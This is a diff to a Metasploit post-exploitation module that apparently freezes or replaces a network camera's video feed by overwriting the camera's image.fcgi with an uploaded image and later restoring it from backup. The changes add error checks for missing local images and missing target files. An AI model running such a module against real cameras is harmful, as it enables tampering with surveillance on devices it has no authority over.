@@ -60,6 +60,7 @@ class MetasploitModule < Msf::Post
 
   def action_change_image
     fail_with(Failure::BadConfig, 'The CHANGE_IMAGE action requires the IMAGE option to be set!') if datastore['IMAGE'].blank?
+    fail_with(Failure::BadConfig, 'The image path specified by IMAGE does not exist!') unless ::File.exist?(datastore['IMAGE'])
     backup_image_fcgi
     print_status('Uploading a custom image...')
     upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])
@@ -69,6 +70,9 @@ class MetasploitModule < Msf::Post
 
   def action_resume_stream
     print_status('Restoring image.fcgi...')
+    unless file_exist?('/usr/www/uapi-cgi/viewer/image.fcgi.bak')
+      fail_with(Failure::NoTarget, "/usr/www/uapi-cgi/viewer/image.fcgi.bak doesn't exist on the target, did you run FREEZE_CAMERA or CHANGE_IMAGE actions yet?")
+    end
     move_file('/usr/www/uapi-cgi/viewer/image.fcgi.bak', '/usr/www/uapi-cgi/viewer/image.fcgi')
     print_status('Restoring main.js backup...')
     move_file('/usr/www/viewer/js/main.js.bak', '/usr/www/viewer/js/main.js')
@@ -86,6 +90,7 @@ class MetasploitModule < Msf::Post
 
   def backup_image_fcgi
     print_status('Backing up image.fcgi...')
+    fail_with(Failure::NoTarget, "/usr/www/uapi-cgi/viewer/image.fcgi doesn't exist on the target!") unless file_exist?('/usr/www/uapi-cgi/viewer/image.fcgi')
     copy_file('/usr/www/uapi-cgi/viewer/image.fcgi', '/usr/www/uapi-cgi/viewer/image.fcgi.bak')
   end
 end
